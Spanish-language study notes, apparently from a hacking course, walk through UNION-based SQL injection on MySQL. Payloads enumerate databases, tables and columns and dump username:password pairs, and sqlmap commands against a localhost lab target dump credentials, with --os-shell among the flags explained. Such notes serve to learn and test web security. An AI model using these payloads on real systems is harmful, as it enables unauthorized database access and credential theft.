-- -
Primero empezamos viendo la cantidad de columnas que existen con el uso de order by.
```sql
id=3' order by 100-- -
```

Una vez vimos la cantidad de columnas que existen empezamos con el uso de union select para empezar a ver el contenido almacenado.
```sql
id=3' union select 1
```
La cláusula UNION en SQL se utiliza para combinar los resultados de dos o más consultas SELECT.
En este caso, se intenta combinar los resultados de la consulta original con los resultados de una nueva consulta que el atacante introduce.

Esto nos tendria que mostrar el dato que esta almacenado en la primer columna de la tabla.
Pero si en vez de poner un identificador valido, ponemos unos no valido nos va a empezar a reflejar lo que ponemos, y ahi es cuando podemos  empezar a ejecutar de todo.  
```sql
id=32' union select database();
```

Con este comando le pedimos que nos liste todas las bases de datos existentes.
```sql
id=32' union select schema_name from information_schema.schemata-- -
```
- **schema_name** --->   columna en la tabla schemata dentro del esquema information_schema. Esta columna contiene los nombres de todas las bases de datos (schemas) en el servidor.
- **information_schema** ---> Esquema especial en MySQL que contiene vistas de metadatos 
- **schemata** ---> Es una tabla dentro del esquema information_schema


El problema es que a veces los resultados terminan siendo limitados. Para evitar eso es mejor jugar con la funcion group_concat() o con limits.
**group_concat** ---> Función que concatena los nombres de todas las tablas en una única cadena, separada por comas.
```sql
id=32' union select group_concat(schema_name) from information_schema.schemata-- -
id=32' union select schema_name from information_schema.schemata limit 0,1-- -
```

Luego, para enumerar las tablas de cierta base de datos podriamos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
```

Luego, tambien para ver las columnas tendriamos q hacer algo muy similiar a lo anterior.
```sql
id=32' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
```

Para listar los usuarios podemos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(username) from users-- -
```

Para listar los usuarios podemos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(username,':',password) from users-- -
```

## Aclaraciones
------- 
- Con el order by tenemos que poner siempre la cantidad de columnas con un solo numero. Por ejemplo si la consulta sql es **"select username,password from users where id = '$id'")**, entonces la inyeccion con el order by seria: **id=1' order by 2-- -** ya que la consulta en si le esta pegando a 2 columnas dentro de la tabla.

- Luego, con el union select tendriamos que darle la cantidad de columas separadas por comas junto con un id valido, por ejemplo: **id=1' union select 1,2-- -** . Despues tendriamos que darle un valor erroneo al id para ver cual de los 2 numero separados por la coma nos muestra la pagina, ejemplo **id=-1' union select 1,2-- -**. Una vez vemos cual es el que nos muestra ahi mismo es donde tenemos que empezar a inyectar los comandos. **id=-1' union select database(),2-- -.
-- - 
## Sqlmap
-- - 
```python
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123791283"
sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u --tables
sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users --columns
sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users -C username,password --dump
```

```python
--dbs --> Enumera las bases de datoso.
--dbms --> solamente prueba payloads para el dbms que le indiquemos. Ej: mysql, oracle, etc.
--batch --> Hace que tome las opciones por defecto.
-D --> Especificamos la base de datos a enumerar.
-T --> Especificamos la tabla a enumerar.
-C --> Indicamos columnas a enumerar.
--os-shell --> Intenta darnos una consola interactiva.
--dump --> Dumpea la base de datos y si las contraseñas estan hasheadas realiza un brute force attack para intentar descubrirlas.
--cookie --> setea cookie de sesion para poder acceder a cierto endpoint de la URL.
--risk --> Nivel de riesgo a probar (1-3, default 1)
--level --> Nivel de testeos a probar (1-5, default 1)
```
-- - 
